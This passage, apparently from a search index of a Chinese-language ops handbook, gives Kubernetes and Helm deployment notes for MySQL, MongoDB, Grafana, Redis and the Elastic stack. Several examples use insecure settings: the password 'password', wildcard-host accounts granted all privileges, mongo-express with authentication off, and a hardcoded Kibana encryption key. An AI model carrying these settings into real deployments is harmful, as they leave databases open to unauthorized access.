ClusterFirst\n        restartPolicy: Always\n        volumes:\n        - configMap:\n            defaultMode: 420\n            name: mysql-5\n          name: mysql-config\n        - name: mysql-data\n          persistentVolumeClaim:\n            claimName: pvc-mysql-5\n- apiVersion: v1\n  kind: Service\n  metadata:\n    labels:\n      k8s-app: mysql-5\n    name: mysql-5\n    namespace: kube-server\n  spec:\n    ports:\n    - port: 3306\n      protocol: TCP\n      targetPort: 3306\n      nodePort: 30306\n    selector:\n      k8s-app: mysql-5\n    type: NodePort\nkind: List\n</code></pre>"},{"location":"kubernetes/21-mysql/#22","title":"2.2\u3001\u9a8c\u6536","text":""},{"location":"kubernetes/21-mysql/#221","title":"2.2.1 \u5b58\u50a8","text":"<pre><code>~ $ kubectl -n kube-server get pv,pvc -A\nNAME                              CAPACITY   ACCESS MODES   RECLAIM POLICY   STATUS   CLAIM                     STORAGECLASS   REASON   AGE\npersistentvolume/pv-mysql-5       20Gi       RWO            Retain           Bound    kube-server/pvc-mysql-5   mysql-5                 3h21m\n\nNAMESPACE     NAME                                  STATUS   VOLUME           CAPACITY   ACCESS MODES   STORAGECLASS   AGE\nkube-server   persistentvolumeclaim/pvc-mysql-5     Bound    pv-mysql-5       20Gi       RWO            mysql-5        3h21m\n\n~ $ tree -L 2 /opt/data/\n/opt/data/\n\u251c\u2500\u2500 mysql-5\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 auto.cnf\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 ca-key.pem\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 ca.pem\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 client-cert.pem\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 client-key.pem\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 grafana\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 ib_buffer_pool\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 ibdata1\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 ib_logfile0\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 ib_logfile1\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 ibtmp1\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 mysql\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 performance_schema\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 private_key.pem\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 public_key.pem\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 server-cert.pem\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 server-key.pem\n\u2502\u00a0\u00a0 \u2514\u2500\u2500 sys\n\u2514\u2500\u2500 mysql-8\n</code></pre>"},{"location":"kubernetes/21-mysql/#222","title":"2.2.2 \u5bb9\u5668","text":"<pre><code>~ $ kubectl -n kube-server get cm,po,svc\nNAME                                                   DATA   AGE\nconfigmap/mysql-5                                      1      3h24m\n\nNAME                                                       READY   STATUS    RESTARTS        AGE\npod/mysql-5-5499976b7b-ms669                               1/1     Running   0               3h24m\n\nNAME                                          TYPE        CLUSTER-IP        EXTERNAL-IP   PORT(S)          AGE\nservice/mysql-5                               NodePort    192.168.145.159   &lt;none&gt;        3306:30306/TCP   3h24m\n</code></pre>"},{"location":"kubernetes/21-mysql/#223","title":"2.2.3 \u8bbf\u95ee","text":"<pre><code>~ $ mysql -h 10.101.11.196 -P30306 -uroot -ppassword\nmysql: [Warning] Using a password on the command line interface can be insecure.\nWelcome to the MySQL monitor.  Commands end with ; or \\g.\nYour MySQL connection id is 141\nServer version: 5.7.37 MySQL Community Server (GPL)\n\nCopyright (c) 2000, 2020, Oracle and/or its affiliates. All rights reserved.\n\nOracle is a registered trademark of Oracle Corporation and/or its\naffiliates. Other names may be trademarks of their respective\nowners.\n\nType 'help;' or '\\h' for help. Type '\\c' to clear the current input statement.\n\nmysql&gt; show databases;\n+--------------------+\n| Database           |\n+--------------------+\n| information_schema |\n| grafana            |\n| mysql              |\n| performance_schema |\n| sys                |\n+--------------------+\n5 rows in set (0.01 sec)\n\nmysql&gt; show grants;\n+-------------------------------------------------------------+\n| Grants for root@%                                           |\n+-------------------------------------------------------------+\n| GRANT ALL PRIVILEGES ON *.* TO 'root'@'%' WITH GRANT OPTION |\n+-------------------------------------------------------------+\n1 row in set (0.02 sec)\n\nmysql&gt;\n</code></pre> <p>8</p> <pre><code># my.cnf \u53bb\u6389 symbolic-links = 0\n# \u8fde\u63a5\u8fdb\u6570\u636e\u5e93\u521b\u5efa\u5e10\u53f7\nCREATE USER 'admin'@'%' IDENTIFIED BY 'password';\nGRANT ALL PRIVILEGES ON *.* TO 'admin'@'%';\n\nALTER USER 'admin'@'%' IDENTIFIED WITH mysql_native_password BY 'password';\nFLUSH PRIVILEGES;\n\nSELECT host,user FROM mysql.user;\n</code></pre>"},{"location":"kubernetes/22-mongo/","title":"Helm + MongoDB","text":""},{"location":"kubernetes/22-mongo/#helm","title":"\u4e00\u3001Helm","text":""},{"location":"kubernetes/22-mongo/#11-install","title":"1.1 Install","text":"<p><code>fake</code></p> <pre><code>helm search repo mongo\nhelm show values bitnami/mongodb --version 13.1.5 &gt; mongo.yaml-13.1.5-default\n\n# standalone\n# Example\n#   https://books.8ops.top/attachment/mongo/helm/mongo.yaml-13.1.5\n#\n\nhelm install mongo-standalone bitnami/mongodb \\\n    -f mongo.yaml-13.1.5 \\\n    -n kube-server \\\n    --create-namespace \\\n    --version 13.1.5 --debug\n\nhelm show values bitnami/mongodb --version 11.2.0 &gt; mongo.yaml-11.2.0-default\n\n###\n# reponse : Illegal instruction\n###\n\n# standalone\n# Example\n#   https://books.8ops.top/attachment/mongo/helm/mongo.yaml-11.2.0\n#\n\nhelm install mongo-standalone bitnami/mongodb \\\n    -f mongo.yaml-11.2.0 \\\n    -n kube-server \\\n    --create-namespace \\\n    --version 11.2.0 --debug\n</code></pre>"},{"location":"kubernetes/22-mongo/#12-download","title":"1.2 download","text":"<pre><code># https://www.mongodb.com/try/download/community\n# server\nhttps://fastdl.mongodb.org/linux/mongodb-linux-x86_64-rhel70-7.0.12.tgz\nhttps://fastdl.mongodb.org/linux/mongodb-linux-x86_64-rhel70-5.0.27.tgz\nhttps://fastdl.mongodb.org/linux/mongodb-linux-x86_64-rhel70-4.4.29.tgz\n\n# client\nhttps://fastdl.mongodb.org/linux/mongodb-shell-linux-x86_64-rhel70-7.0.12.tgz\nhttps://fastdl.mongodb.org/linux/mongodb-shell-linux-x86_64-rhel70-5.0.27.tgz\nhttps://fastdl.mongodb.org/linux/mongodb-shell-linux-x86_64-rhel70-4.4.29.tgz\n\n# https://www.mongodb.com/try/download/shell\nhttps://fastdl.mongodb.org/tools/db/mongodb-database-tools-rhel70-x86_64-100.9.5.tgz\n</code></pre>"},{"location":"kubernetes/22-mongo/#docker","title":"\u4e8c\u3001Docker","text":"<p>all-in-one.yaml</p> <pre><code>cat &gt; docker-compose.yaml &lt;&lt;EOF\nservices:\n\n  mongo:\n    image: mongo:4.4.29\n    restart: always\n    container_name: mongo\n    network_mode: host\n    ports:\n      - 27017:27017\n#    environment:\n#      MONGO_INITDB_ROOT_USERNAME: root\n#      MONGO_INITDB_ROOT_PASSWORD: example\n    volumes:\n      - /opt/lib/mongo/data:/data/db\n\n  mongo-express:\n    image: mongo-express:1.0.2-18\n    restart: always\n    container_name: mongo-express\n    network_mode: host\n    ports:\n      - 8081:8081\n    environment:\n#      ME_CONFIG_MONGODB_ADMINUSERNAME: root\n#      ME_CONFIG_MONGODB_ADMINPASSWORD: example\n#      ME_CONFIG_MONGODB_URL: mongodb://root:example@mongo:27017/\n      ME_CONFIG_MONGODB_URL: mongodb://127.0.0.1:27017/\n      ME_CONFIG_BASICAUTH: false\n\nEOF\n\ndocker compose up -d\n</code></pre>"},{"location":"kubernetes/22-mongo/#_1","title":"\u4e09\u3001\u5e38\u89c1\u95ee\u9898","text":""},{"location":"kubernetes/22-mongo/#31","title":"3.1 \u5bf9\u6307\u4ee4\u7684\u7279\u522b\u8981\u6c42","text":"<p>Reference</p> <p>mongodb 5 on x86 requires a cpu with avx, check your cpu flags of the kubernetes node with <code>lscpu | grep avx</code></p> <p>\u5b98\u65b9\u89e3\u91ca</p>"},{"location":"kubernetes/23-grafana/","title":"Helm + Grafana","text":"<p>\u5148\u51c6\u5907mysql\u5b58\u50a8grafana\u7684metedata\u4fe1\u606f\u5b9e\u6218 | \u57fa\u4e8eKubernetes\u4f7f\u7528MySQL</p> name value database grafana username grafana password grafana"},{"location":"kubernetes/23-grafana/#_1","title":"\u4e00\u3001\u5b89\u88c5","text":"<pre><code>helm repo add grafana https://grafana.github.io/helm-charts\nhelm repo update grafana\nhelm search repo grafana\n\nhelm show values grafana/grafana --version 6.38.1 &gt; grafana.yaml-6.38.1-default \n\n# Example \n#   https://books.8ops.top/attachment/grafana/helm/grafana.yaml-6.38.1\n# \n\nhelm install grafana grafana/grafana \\\n    -f grafana.yaml-6.38.1 \\\n    -n kube-server \\\n    --create-namespace \\\n    --version 6.38.1 --debug\n\nhelm upgrade --install grafana grafana/grafana \\\n    -f grafana.yaml-6.38.1 \\\n    -n kube-server \\\n    --create-namespace \\\n    --version 6.38.1 --debug\n\nhelm -n kube-server uninstall grafana    \n\nCREATE DATABASE `grafana` DEFAULT CHARACTER SET utf8mb4 COLLATE utf8mb4_0900_ai_ci;\n\n# reset admin exec container\ngrafana-cli admin reset-admin-password \"admin\"\n</code></pre>"},{"location":"kubernetes/23-grafana/#_2","title":"\u4e8c\u3001\u5347\u7ea7","text":"<pre><code>helm show values grafana/grafana &gt; grafana.yaml-6.38.1-default \n\n# Example \n#   https://books.8ops.top/attachment/grafana/helm/grafana.yaml-6.38.1\n# \n\nhelm install grafana grafana/grafana \\\n    -f grafana.yaml-6.38.1 \\\n    -n kube-server \\\n    --create-namespace \\\n    --version 6.38.1 --debug\n</code></pre>"},{"location":"kubernetes/23-grafana/#_3","title":"\u4e09\u3001\u6a21\u677f","text":"<p>Category</p> <ul> <li>Application</li> <li>GenDash</li> <li>Kubernetes</li> <li>Middleware</li> <li>Network</li> <li>General</li> </ul> <pre><code>https://books.8ops.top/attachment/grafana/template/kube-state-metrics.json\nhttps://books.8ops.top/attachment/grafana/template/kubernetes-cluster-monitoring.json\nhttps://books.8ops.top/attachment/grafana/template/kubernetes-cluster-summary.json\nhttps://books.8ops.top/attachment/grafana/template/kubernetes-node-exporter-full.json\nhttps://books.8ops.top/attachment/grafana/template/middleware-mysql-overview.json\nhttps://books.8ops.top/attachment/grafana/template/middleware-nginx-ingress-controller.json\nhttps://books.8ops.top/attachment/grafana/template/middleware-redis-ha.json\n</code></pre>"},{"location":"kubernetes/23-grafana/#_4","title":"\u56db\u3001\u6548\u679c","text":"<p>\u5b98\u65b9\u6a21\u677f</p> <p></p> <p></p> <p></p> <p></p> <p></p> <p></p> <p></p> <p></p>"},{"location":"kubernetes/23-grafana/#_5","title":"\u4e94\u3001\u8fdb\u9636","text":""},{"location":"kubernetes/23-grafana/#51","title":"5.1 \u53d8\u91cf","text":""},{"location":"kubernetes/23-grafana/#52","title":"5.2 \u63d2\u4ef6","text":""},{"location":"kubernetes/23-grafana/#521-node-graph","title":"5.2.1 node graph","text":"<p>Reference</p> <pre><code># \u63d2\u4ef6\u540d\u79f0\nhamedkarbasi93-nodegraphapi-datasource\n</code></pre>"},{"location":"kubernetes/23-grafana/#522-echarts","title":"5.2.2 echarts","text":"<pre><code># \u63d2\u4ef6\u540d\u79f0\nvolkovlabs-echarts-panel\n</code></pre>"},{"location":"kubernetes/23-grafana/#523-static-database","title":"5.2.3 static database","text":"<pre><code># \u63d2\u4ef6\u540d\u79f0\nmarcusolsson-static-datasource\n</code></pre>"},{"location":"kubernetes/23-grafana/#524-diagram-panel","title":"5.2.4 diagram panel","text":"<pre><code># \u63d2\u4ef6\u540d\u79f0\njdbranham-diagram-panel\n\n# Mermaid syntax\ngraph LR\nA[alias A] \nB{alias B}\nA --&gt; B ----&gt; D[rect]\nB --&gt; E[(database)]\nA --&gt; C{{polygon}} --&gt; F\nC --&gt; G((circle))\nG ----&gt;|long line| I\nG ----&gt; J(round rect)\n</code></pre>"},{"location":"kubernetes/24-redis/","title":"Helm + Redis","text":"<p>\u63d0\u524d\u6301\u4e45\u5316</p>"},{"location":"kubernetes/24-redis/#install","title":"\u4e00\u3001Install","text":"<pre><code>helm repo add bitnami https://charts.bitnami.com/bitnami\nhelm repo update bitnami\nhelm search repo redis\n\n# sentinel\nhelm show values bitnami/redis --version 16.8.7 &gt; redis-sentinel.yaml-16.8.7-default\n\n# Example\n#   https://books.8ops.top/attachment/redis/helm/redis-sentinel.yaml-16.8.7\n#\n\nhelm upgrade --install redis-sentinel bitnami/redis \\\n    -f redis-sentinel.yaml-16.8.7 \\\n    -n kube-server \\\n    --create-namespace \\\n    --version 16.8.7\n\nhelm -n kube-server uninstall redis-sentinel \n\n# cluster\nhelm show values bitnami/redis-cluster --version 7.5.0 &gt; redis-cluster.yaml-7.5.0-default\n\n# Example\n#   https://books.8ops.top/attachment/redis/helm/redis-cluster.yaml-7.5.0\n#\n\nhelm install redis-cluster bitnami/redis-cluster \\\n    -f redis-cluster.yaml-7.5.0 \\\n    -n kube-server \\\n    --create-namespace \\\n    --version 7.5.0 --debug\n\nhelm upgrade --install redis-cluster bitnami/redis-cluster \\\n    -f redis-cluster.yaml-7.5.0 \\\n    -n kube-server \\\n    --create-namespace \\\n    --version 7.5.0 --debug\n\nhelm -n kube-server uninstall redis-cluster \n</code></pre>"},{"location":"kubernetes/24-redis/#usage","title":"\u4e8c\u3001Usage","text":"<pre><code># redis-ha\nkubectl -n kube-server exec -it redis-ha-node-0 sh\n\nPATH=/opt/bitnami/redis/bin:$PATH\nredis-cli -h redis-sentinel\nauth jesse\n\n# redis-cluster\nredis-cli -h redis-cluster -c\nauth jesse\n\nkubectl -n kube-server scale sts redis-cluster --replicas=0\n\n## add nodes\nredis-cli --cluster add-node 127.0.0.1:7000 172.31.6.35:7000\nredis-cli --cluster reshard 127.0.0.1:7000\nredis-cli --cluster add-node 127.0.0.1:7001 172.31.6.35:7000 --cluster-slave --cluster-master-id [MASTER_NODE_ID]\n</code></pre>"},{"location":"kubernetes/24-redis/#single","title":"\u4e09\u3001Single","text":""},{"location":"kubernetes/25-elastic/","title":"Helm + Elastic","text":""},{"location":"kubernetes/25-elastic/#eck-operater","title":"\u4e00\u3001ECK-Operater","text":"<p>Elastic Cloud on Kubernetes</p> <p>\u57fa\u4e8ekubernetes\u90e8\u7f72</p> <p>Reference</p> <pre><code># https://download.elastic.co/downloads/eck/1.2.1/all-in-one.yaml\n# https://download.elastic.co/downloads/eck/2.4.0/crds.yaml\n# https://download.elastic.co/downloads/eck/2.4.0/operator.yaml\n</code></pre> <p>\u53c2\u8003</p> <p>\u6f14\u793a3\u8282\u70b9\u7684\u96c6\u7fa4</p> <pre><code># version: 7.17.3\n\n# Example\n#   https://books.8ops.top/attachment/elastic/01-persistent-elastic-eck-pv.yaml\n#   https://books.8ops.top/attachment/elastic/01-persistent-elastic-eck-pvc.yaml\n#   https://books.8ops.top/attachment/elastic/10-eck_crds.yaml-2.4.0\n#   https://books.8ops.top/attachment/elastic/10-eck_operator.yaml-2.4.0\n#   https://books.8ops.top/attachment/elastic/11-eck-elastic.yaml-7.17.3\n#   https://books.8ops.top/attachment/elastic/12-eck-kibana.yaml-7.17.3\n#\n\n# 1\uff0c\u5b89\u88c5 ECK \u5bf9\u5e94\u7684 Operator \u8d44\u6e90\u5bf9\u8c61\nkubectl apply -f elastic_eck_crds.yaml-2.4.0\nkubectl apply -f elastic_eck_operator.yaml-2.4.0\n\n# 2\uff0c\u521b\u5efa\u78c1\u76d8\u6302\u8f7d\nkubectl apply -f 01-persistent-elastic-pv.yaml\nkubectl apply -f 01-persistent-elastic-pvc.yaml\n\n# 3\uff0c\u521b\u5efa elastic \u8282\u70b9\nkubectl apply -f 10-elastic.yaml-7.17.3\n\nkubectl port-forward service/quickstart-es-http 5601\n\n## \u83b7\u53d6 ES \u5bc6\u7801\nkubectl get secret quickstart-es-elastic-user -o go-template='{{.data.elastic | base64decode}}' | echo\n\n# 4\uff0c\u521b\u5efakibana\u7ec4\u4ef6\nkubectl apply -f 11-kibana.yaml-7.17.3\n\nkubectl port-forward service/quickstart-kb-http 5601\n\n## \u83b7\u53d6 KB \u5bc6\u7801\nkubectl get secret quickstart-es-elastic-user -o=jsonpath='{.data.elastic}' | base64 --decode; echo\n</code></pre>"},{"location":"kubernetes/25-elastic/#onekey","title":"\u4e8c\u3001OneKey","text":"<p>\u57fa\u4e8e\u5355\u673a\u90e8\u7f72</p> <ul> <li> <p>version: 7.0.1</p> </li> <li> <p>method:  docker-compose</p> </li> </ul> <pre><code>version: '2.2'\nservices:\n  es-node-01:\n    image: docker.elastic.co/elasticsearch/elasticsearch:7.0.1\n    container_name: es-node-01\n    environment:\n      - node.name=es-node-01\n      - discovery.seed_hosts=es-node-02\n      - cluster.initial_master_nodes=es-node-01,es-node-02\n      - cluster.name=es-cluster\n      - bootstrap.memory_lock=true\n      - \"ES_JAVA_OPTS=-Xms4g -Xmx4g\"\n    ulimits:\n      memlock:\n        soft: -1\n        hard: -1\n    ports:\n      - 19200:9200\n    networks:\n      - esnet\n  es-node-02:\n    image: docker.elastic.co/elasticsearch/elasticsearch:7.0.1\n    container_name: es-node-02\n    environment:\n      - node.name=es-node-02\n      - discovery.seed_hosts=es-node-01\n      - cluster.initial_master_nodes=es-node-01,es-node-02\n      - cluster.name=es-cluster\n      - bootstrap.memory_lock=true\n      - \"ES_JAVA_OPTS=-Xms4g -Xmx4g\"\n    ulimits:\n      memlock:\n        soft: -1\n        hard: -1\n    ports:\n      - 29200:9200\n    networks:\n      - esnet\n  es-node-03:\n    image: docker.elastic.co/elasticsearch/elasticsearch:7.0.1\n    container_name: es-node-03\n    environment:\n      - node.name=es-node-03\n      - discovery.seed_hosts=es-node-01\n      - cluster.initial_master_nodes=es-node-01,es-node-02\n      - cluster.name=es-cluster\n      - bootstrap.memory_lock=true\n      - \"ES_JAVA_OPTS=-Xms4g -Xmx4g\"\n    ulimits:\n      memlock:\n        soft: -1\n        hard: -1\n    networks:\n      - esnet\n\n  es-redis:\n    image: redis:5.0.5\n    container_name: es-redis\n    ports:\n      - 16379:6379\n    networks:\n      - esnet\n\n  es-logstash-01:\n    image: docker.elastic.co/logstash/logstash:7.0.1\n    container_name: es-logstash-01\n    links:\n      - es-node-01\n      - es-node-02\n      - es-redis\n    volumes:\n      - /data/elk/logstash/pipeline:/usr/share/logstash/pipeline\n    networks:\n      - esnet\n\nnetworks:\n  esnet:\n</code></pre>"},{"location":"kubernetes/25-elastic/#helm","title":"\u4e09\u3001Helm","text":"<p>Reference</p>"},{"location":"kubernetes/25-elastic/#31","title":"3.1 \u5b89\u5168\u51c6\u5907","text":"<p>ElasticSearch 7.x \u7248\u672c\u9ed8\u8ba4\u5b89\u88c5\u4e86 X-Pack \u63d2\u4ef6\uff0c\u5e76\u4e14\u90e8\u5206\u529f\u80fd\u514d\u8d39\uff0c\u8fd9\u91cc\u6211\u4eec\u914d\u7f6e\u5b89\u5168\u8bc1\u4e66\u6587\u4ef6\u3002</p> <p>\u751f\u6210\u8bc1\u4e66</p> <pre><code># \u8fd0\u884c\u5bb9\u5668\u751f\u6210\u8bc1\u4e66\ndocker run --name elastic-charts-certs \\\n  -i -w /app hub.8ops.top/elastic/elasticsearch:7.17.3 \\\n  /bin/sh -c \"elasticsearch-certutil ca --out /app/elastic-stack-ca.p12 --pass '' &amp;&amp; elasticsearch-certutil cert --name security-master --dns security-master --ca /app/elastic-stack-ca.p12 --pass '' --ca-pass '' --out /app/elastic-certificates.p12\"\n\n# \u4ece\u5bb9\u5668\u4e2d\u5c06\u751f\u6210\u7684\u8bc1\u4e66\u62f7\u8d1d\u51fa\u6765\ndocker cp elastic-charts-certs:/app/elastic-certificates.p12 ./ \n\n# \u5220\u9664\u5bb9\u5668\ndocker rm -f elastic-charts-certs\n\n# \u5c06 pcks12 \u4e2d\u7684\u4fe1\u606f\u5206\u79bb\u51fa\u6765\uff0c\u5199\u5165\u6587\u4ef6\nopenssl pkcs12 -nodes -passin pass:'' \\\n  -in elastic-certificates.p12 \\\n  -out elastic-certificate.pem\n</code></pre> <p>\u6dfb\u52a0\u8bc1\u4e66\u5230\u96c6\u7fa4</p> <pre><code># \u6dfb\u52a0\u8bc1\u4e66\nkubectl -n elastic-system create secret generic elastic-certificates \\\n  --from-file=lib/elastic-certificates.p12\nkubectl -n elastic-system create secret generic elastic-certificate-pem \\\n  --from-file=lib/elastic-certificate.pem\n\n# \u8bbe\u7f6e\u96c6\u7fa4\u7528\u6237\u540d\u5bc6\u7801\uff0c\u7528\u6237\u540d\u4e0d\u5efa\u8bae\u4fee\u6539\nkubectl -n elastic-system create secret generic elastic-credentials \\\n  --from-literal=username=elastic --from-literal=password=xx\n\nkubectl -n elastic-system create secret generic kibana \\\n  --from-literal=encryptionkey=zGFTX0cy3ubYVmzuunACDZuRj0PALqOM\n</code></pre> <p>\u5c1d\u8bd5\u542f\u52a8xpack\u8d44\u6599</p> <ul> <li>https://github.com/elastic/helm-charts/tree/7.17/kibana/examples/security</li> </ul>"},{"location":"kubernetes/25-elastic/#32","title":"3.2 \u5b89\u88c5","text":""},{"location":"kubernetes/25-elastic/#321-elasticsearch","title":"3.2.1 elasticsearch","text":"<pre><code>helm repo add elastic https://helm.elastic.co\nhelm repo update elastic\n\nhelm search repo elastic\nhelm show values elastic/elasticsearch --version 7.17.3 &gt; elasticsearch.yaml-7.17.3\n\n# Example\n#   https://books.8ops.top/attachment/elastic/01-persistent-elastic-cluster.yaml\n#   https://books.8ops.top/attachment/elastic/helm/elastic-cluster-master.yaml-7.17.3\n#   https://books.8ops.top/attachment/elastic/helm/elastic-cluster-data.yaml-7.17.3\n#   https://books.8ops.top/attachment/elastic/helm/elastic-cluster-client.yaml-7.17.3\n#\n\n# master \u8282\u70b9\nhelm upgrade --install elastic-cluster-master elastic/elasticsearch \\\n    -f elastic-cluster-master.yaml-7.17.3 \\\n    -n elastic-system\\\n    --version 7.17.3\n\n# data \u8282\u70b9\nhelm upgrade --install elastic-cluster-data elastic/elasticsearch \\\n    -f elastic-cluster-data.yaml-7.17.3 \\\n    -n elastic-system\\\n    --version 7.17.3\n\n# client \u8282\u70b9\nhelm upgrade --install elastic-cluster-client elastic/elasticsearch \\\n    -f elastic-cluster-client.yaml-7.17.3 \\\n    -n elastic-system\\\n    --version 7.17.3\n\n#### \n# \u5c1d\u8bd5\u7981\u7528 xpack.security.enabled \n# \nkubectl -n elastic-system delete pvc \\\n    elastic-cluster-data-elastic-cluster-data-0 \\\n    elastic-cluster-data-elastic-cluster-data-1 \\\n    elastic-cluster-data-elastic-cluster-data-2 \\\n    elastic-cluster-master-elastic-cluster-master-0 \\\n    elastic-cluster-master-elastic-cluster-master-1 \\\n    elastic-cluster-master-elastic-cluster-master-2\n</code></pre>"},{"location":"kubernetes/25-elastic/#322-kibana","title":"3.2.2 kibana","text":"<pre><code>helm search repo kibana\nhelm show values elastic/kibana --version 7.17.3 &gt; kibana.yaml-7.17.3\n\n# Example\n#   https://books.8ops.top/attachment/elastic/helm/kibana.yaml-7.17.3\n# \n\nhelm upgrade --install kibana elastic/kibana \\\n    -f kibana.yaml-7.17.3 \\\n    -n elastic-system \\\n    --version 7.17.3\n</code></pre>"},{"location":"kubernetes/25-elastic/#323-kafka","title":"3.2.3 kafka","text":"<p>Reference</p> <pre><code># Example\n#   https://github.com/bitnami/containers/tree/main/bitnami/kafka\n#   \n#   https://books.8ops.top/attachment/elastic/helm/kafka.yaml-19.0.1\n#   \n\nhelm repo update bitnami\nhelm search repo kafka\nhelm show values bitnami/kafka --version 19.0.1 &gt; kafka.yaml-19.0.1.default\n\nhelm upgrade --install kafka bitnami/kafka \\\n    -f kafka.yaml-19.0.1 \\\n    -n elastic-system \\\n    --version 19.0.1\n\n#\n# \u82e5\u91cd\u7f6e\u9700\u8981\u5220\u9664\u539f\u6570\u636e\uff0c\u6216\u8005\u4e0d\u6302\u8f7d\u78c1\u76d8\n# \u5426\u5219\u4f1a\u56e0\u4e3acluster_id\u51b2\u7a81\n# --------------------------------------------- #\n# usage\nkubectl run kafka-client --restart='Never' \\\n  --image hub.8ops.top/bitnami/kafka:3.3.1-debian-11-r1 \\\n  --namespace elastic-system --command -- sleep infinity\n\nkubectl exec --tty -i kafka-client --namespace elastic-system -- bash\n\n# \u65b0\u7248\u672c\u4e0d\u9700\u8981\u8fde\u63a5 ZK\n## PRODUCER:\nkafka-console-producer.sh \\\n    --broker-list kafka-0.kafka-headless.elastic-system.svc.cluster.local:9092 \\\n    --topic test\n\n## CONSUMER:\nkafka-console-consumer.sh \\\n    --bootstrap-server kafka.elastic-system.svc.cluster.local:9092 \\\n    --topic www-online-ui \\\n    --from-beginning\n\n# \u67e5\u770b\u6d88\u8d39\u60c5\u51b5\nkafka-consumer-groups.sh \\\n    --bootstrap-server kafka-headless.elastic-system.svc.cluster.local:9092 \\\n    --describe \n\n# \u67e5\u770btopic\nkafka-topics.sh \\\n    --bootstrap-server kafka-headless.elastic-system.svc.cluster.local:9092 \\\n    --list\n\n# \u67e5\u770b\u540c\u6b65\u5355\u4e2atopic\nkafka-topics.sh \\\n    --bootstrap-server kafka-headless.elastic-system.svc.cluster.local:9092 \\\n    --topic test --describe\n\n# \u5220\u9664topic - TODO\nkafka-run-class.sh kafka.admin.TopicCommand \\\n    --bootstrap-server kafka-headless.elastic-system.svc.cluster.local:9092 \\\n    --delete --topic test \n\n# \u4fee\u6539\u526f\u672c\u6570/ \u5b58\u50a8\u8fc7\u671f\u65f6\u95f4 - TODO\nkafka-topics.sh \\\n    --bootstrap-server kafka-headless.elastic-system.svc.cluster.local:9092 \\\n    --topic demo-json --partitions 6\n</code></pre> <p></p>"},{"location":"kubernetes/25-elastic/#324-logstash","title":"3.2.4 logstash","text":"<pre><code># Example\n#   https://books.8ops.top/attachment/elastic/helm/logstash.yaml-7.17.3\n#   \n\nhelm search repo logstash\nhelm show values elastic/logstash --version 7.17.3 &gt; logstash.yaml-7.17.3-default\n\nhelm upgrade --install logstash elastic/logstash \\\n    -f logstash.yaml-7.17.3 \\\n    -n elastic-system \\\n    --version 7.17.3\n</code></pre>"},{"location":"kubernetes/25-elastic/#325-filebeat","title":"3.2.5 filebeat","text":"<p>Reference</p> <pre><code># Example: \n#   - demo.json/demo.out --&gt; filebeat --&gt; elasticsearch --&gt; kibana\n#   https://books.8ops.top/attachment/elastic/50-filebeat-demo.yaml\n# \n#   - demo.json/demo.out --&gt; filebeat --&gt; kafka --&gt; elasticsearch --&gt; logstash --&gt; kibana\n#   https://books.8ops.top/attachment/elastic/50-filebeat-demo-kafka.yaml\n# \n\n# ---\nhelm search repo filebeat\nhelm show values elastic/filebeat --version 7.17.3 &gt; filebeat.yaml-7.17.3.default\n</code></pre>"},{"location":"kubernetes/25-elastic/#_1","title":"\u56db\u3001\u5e38\u7528\u5b9e\u8df5","text":""},{"location":"kubernetes/25-elastic/#41","title":"4.1 \u5bb9\u5668\u73af\u5883\u6536\u96c6\u65e5\u5fd7\u65b9\u6848","text":"\u65b9\u6848 \u4f18\u70b9 \u7f3a\u70b9 \u6bcf\u4e2aapp\u7684\u955c\u50cf\u4e2d\u90fd\u96c6\u6210\u65e5\u5fd7\u6536\u96c6\u7ec4\u4ef6\u6216\u7531app\u955c\u50cf\u76f4\u63a5\u5c06\u4fe1\u606f\u63a8\u9001\u5230\u91c7\u96c6\u7aef \u90e8\u7f72\u65b9\u4fbf\uff0ckubernetes\u7684yaml\u6587\u4ef6\u65e0\u987b\u7279\u522b\u914d\u7f6e\uff0c\u53ef\u4ee5\u4e3a\u6bcf\u4e2aapp\u81ea\u5b9a\u4e49\u65e5\u5fd7\u6536\u96c6\u914d\u7f6e \u5f3a\u8026\u5408\uff0c\u4e0d\u65b9\u4fbf\u5e94\u7528\u548c\u65e5\u5fd7\u6536\u96c6\u7ec4\u4ef6\u5347\u7ea7\u548c\u7ef4\u62a4\u4e14\u4f1a\u5bfc\u81f4\u955c\u50cf\u8fc7\u5927 \u5355\u72ec\u521b\u5efa\u4e00\u4e2a\u65e5\u5fd7\u6536\u96c6\u7ec4\u4ef6\u8ddfapp\u7684\u5bb9\u5668\u4e00\u8d77\u8fd0\u884c\u5728\u540c\u4e00\u4e2apod\u4e2d \u4f4e\u8026\u5408\uff0c\u6269\u5c55\u6027\u5f3a\uff0c\u65b9\u4fbf\u7ef4\u62a4\u548c\u5347\u7ea7 \u9700\u8981\u5bf9kubernetes\u7684yaml\u6587\u4ef6\u8fdb\u884c\u5355\u72ec\u914d\u7f6e\uff0c\u7565\u663e\u7e41\u7410 \u5c06\u6240\u6709\u7684Pod\u7684\u65e5\u5fd7\u90fd\u6302\u8f7d\u5230\u5bbf\u4e3b\u673a\u4e0a\uff0c\u6bcf\u53f0\u4e3b\u673a\u4e0a\u5355\u72ec\u8d77\u4e00\u4e2a\u65e5\u5fd7\u6536\u96c6Pod \u5b8c\u5168\u89e3\u8026\uff0c\u6027\u80fd\u6700\u9ad8\uff0c\u7ba1\u7406\u8d77\u6765\u6700\u65b9\u4fbf \u9700\u8981\u7edf\u4e00\u65e5\u5fd7\u6536\u96c6\u89c4\u5219\uff0c\u76ee\u5f55\u548c\u8f93\u51fa\u65b9\u5f0f"},{"location":"kubernetes/25-elastic/#42-ilm","title":"4.2 ILM","text":"<p>\u8fdb\u5165kibana\u7ba1\u7406\u754c\u9762\uff0c\u8fdb\u5165<code>Management --&gt; Dev Tools</code></p> <pre><code># 